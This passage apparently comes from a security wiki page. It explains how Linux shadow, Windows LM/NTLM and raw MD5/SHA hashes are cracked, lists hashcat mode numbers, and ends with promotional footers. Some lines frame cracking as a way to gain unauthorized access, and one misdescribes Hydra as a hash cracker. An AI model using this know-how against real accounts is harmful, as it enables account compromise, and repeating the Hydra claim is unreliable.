Cracking Linux hashes from the `/etc/shadow` file can be a valuable technique for hackers seeking unauthorized access to user accounts. By following the outlined methodology and using appropriate cracking tools, hackers can potentially obtain sensitive information and compromise the security of a Linux system.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Cracking Windows Hashes

## Introduction

When conducting a penetration test or performing password auditing, it is often necessary to crack Windows hashes. Windows hashes are used to store user passwords in a hashed format, making it difficult to retrieve the original password. However, with the right tools and techniques, it is possible to crack these hashes and obtain the plaintext passwords.

## Brute-Force Attacks

One common method for cracking Windows hashes is through brute-force attacks. Brute-force attacks involve systematically trying every possible combination of characters until the correct password is found. This can be a time-consuming process, especially for complex passwords, but it can be effective if given enough time and computing power.

### Dictionary Attacks

A dictionary attack is a type of brute-force attack that uses a pre-defined list of words, phrases, or commonly used passwords as the input for cracking the hash. This approach is more efficient than a pure brute-force attack, as it reduces the number of possible combinations to try.

### Hybrid Attacks

A hybrid attack combines elements of both brute-force and dictionary attacks. It involves using a combination of a dictionary and brute-force attack to crack the hash. This approach is useful when the password contains a combination of common words and complex characters.

## Rainbow Tables

Another method for cracking Windows hashes is by using rainbow tables. Rainbow tables are precomputed tables that contain a large number of hashes and their corresponding plaintext passwords. By comparing the hash to the entries in the rainbow table, it is possible to find a match and retrieve the original password.

## Online Services

There are also online services available that can crack Windows hashes for you. These services often use powerful computing resources and large databases of precomputed hashes to quickly crack the passwords. However, it is important to note that using these services may raise ethical and legal concerns, so caution should be exercised.

## Conclusion

Cracking Windows hashes can be a challenging task, but with the right tools and techniques, it is possible to retrieve the plaintext passwords. Brute-force attacks, dictionary attacks, hybrid attacks, rainbow tables, and online services are all methods that can be used to crack Windows hashes. It is important to choose the appropriate method based on the specific scenario and available resources.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Cracking Common Application Hashes

## Introduction

In this section, we will discuss the process of cracking common application hashes. Hash cracking is a technique used to recover plaintext passwords from their hashed representations. By cracking the hashes, we can gain unauthorized access to various applications and systems.

## Types of Hashes

There are several types of hashes commonly used in applications. Some of the most common ones include:

- **MD5**: This is a widely used hash function that produces a 128-bit hash value. It is commonly used in various applications and databases.
- **SHA-1**: This is another widely used hash function that produces a 160-bit hash value. It is commonly used in applications and systems.
- **SHA-256**: This is a more secure hash function that produces a 256-bit hash value. It is commonly used in modern applications and systems.

## Hash Cracking Techniques

There are various techniques that can be used to crack common application hashes. Some of the most common techniques include:

- **Brute Force**: This technique involves trying all possible combinations of characters until the correct password is found. It is a time-consuming process but can be effective for cracking weak passwords.
- **Dictionary Attack**: This technique involves using a pre-generated list of commonly used passwords, known as a dictionary, to crack the hashes. It is faster than brute force and can be effective for cracking passwords that are commonly used.
- **Rainbow Tables**: This technique involves using precomputed tables of hash values and their corresponding plaintext passwords to crack the hashes. It is a faster method compared to brute force and dictionary attacks.

## Tools for Hash Cracking

There are several tools available for cracking common application hashes. Some of the most popular ones include:

- **John the Ripper**: This is a powerful password cracking tool that supports various hash types, including MD5, SHA-1, and SHA-256.
- **Hashcat**: This is another popular password cracking tool that supports a wide range of hash types, including MD5, SHA-1, and SHA-256.
- **Hydra**: This is a versatile password cracking tool that supports various protocols and can be used for cracking hashes in applications and systems.

## Conclusion

Cracking common application hashes is an essential skill for hackers and penetration testers. By understanding the different types of hashes, the cracking techniques, and the tools available, hackers can gain unauthorized access to applications and systems. However, it is important to note that hash cracking should only be performed with proper authorization and for legitimate purposes.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti comunitari **più avanzati al mondo**.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
